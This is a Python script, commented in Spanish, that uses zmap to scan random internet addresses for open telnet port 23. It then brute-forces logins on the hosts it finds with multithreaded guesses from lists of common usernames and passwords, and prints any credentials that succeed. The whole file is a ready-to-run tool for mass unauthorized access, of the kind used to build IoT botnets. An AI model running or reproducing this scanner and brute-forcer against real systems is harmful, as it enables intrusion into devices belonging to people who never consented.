import telnetlib
import time
import threading
import subprocess

# Usuarios y contraseñas comunes (amplios)
common_users = [
    "root", "admin", "user", "guest", "test", "administrator",
    "operator", "support", "sysadmin", "admin1", "admin123",
    "user1", "test1", "guest1", "adminuser", "superuser",
    "manager", "oracle", "ftp", "postgres", "apache",
    "webadmin", "testuser", "dbadmin", "guestuser", "default"
]

common_passwords = [
    "1234", "admin", "password", "123456", "12345", "12345678",
    "qwerty", "letmein", "root", "pass", "default", "123",
    "guest", "123123", "password1", "abc123", "111111",
    "123456789", "1234567", "welcome", "monkey", "dragon",
    "football", "iloveyou", "master", "sunshine", "login",
    "admin123", "solo", "starwars", "hello", "freedom",
    "whatever", "qazwsx", "trustno1", "123321"
]

MAX_ATTEMPTS_PER_IP = 20
THREADS = 10  # Número de hilos simultáneos
ZMAP_RESULT_FILE = "telnet_ips.txt"
ZMAP_MAX_RESULTS = 1000

def telnet_brute(ip, user_list, pass_list, max_attempts=MAX_ATTEMPTS_PER_IP):
    try:
        tn = telnetlib.Telnet(ip, 23, timeout=2)
        tn.read_until(b"login: ", timeout=2)

        attempts = 0
        for user in user_list:
            for passwd in pass_list:
                if attempts >= max_attempts:
                    tn.close()
                    return False

                tn.write(user.encode('ascii') + b"\n")
                time.sleep(0.1)
                tn.read_until(b"Password: ", timeout=2)
                tn.write(passwd.encode('ascii') + b"\n")
                time.sleep(0.2)

                output = tn.read_very_eager()
                if b"incorrect" not in output.lower():
                    print(f"[+] Éxito en {ip} | Usuario: {user} | Contraseña: {passwd}")
                    tn.close()
                    return True

                attempts += 1

        tn.close()
        print(f"[-] No se encontró acceso válido en {ip}")
    except Exception:
        # Opcional: print(f"[-] No se pudo conectar a {ip}")
        pass
    return False

def run_zmap_scan():
    print("[*] Ejecutando zmap para escanear IPs con puerto 23 abierto...")
    cmd = [
        "sudo", "zmap",
        "-p", "23",
        "-o", ZMAP_RESULT_FILE,
        "--max-results", str(ZMAP_MAX_RESULTS)
    ]
    subprocess.run(cmd)
    print(f"[*] Escaneo terminado, resultados guardados en {ZMAP_RESULT_FILE}")

def worker(ip_list):
    while True:
        try:
            ip = ip_list.pop()
        except IndexError:
            return
        telnet_brute(ip, common_users, common_passwords)

def main():
    # 1. Escanear IPs con zmap
    run_zmap_scan()

    # 2. Leer IPs encontradas
    with open(ZMAP_RESULT_FILE, "r") as f:
        ips = [line.strip() for line in f if line.strip()]

    print(f"[*] IPs encontradas con puerto 23 abierto: {len(ips)}")

    # 3. Crear lista para threads
    ip_list = ips.copy()

    # 4. Crear y lanzar threads
    threads = []
    for _ in range(min(THREADS, len(ip_list))):
        t = threading.Thread(target=worker, args=(ip_list,))
        t.start()
        threads.append(t)

    # 5. Esperar que terminen threads
    for t in threads:
        t.join()

    print("[*] Proceso finalizado.")

if __name__ == "__main__":
    main()
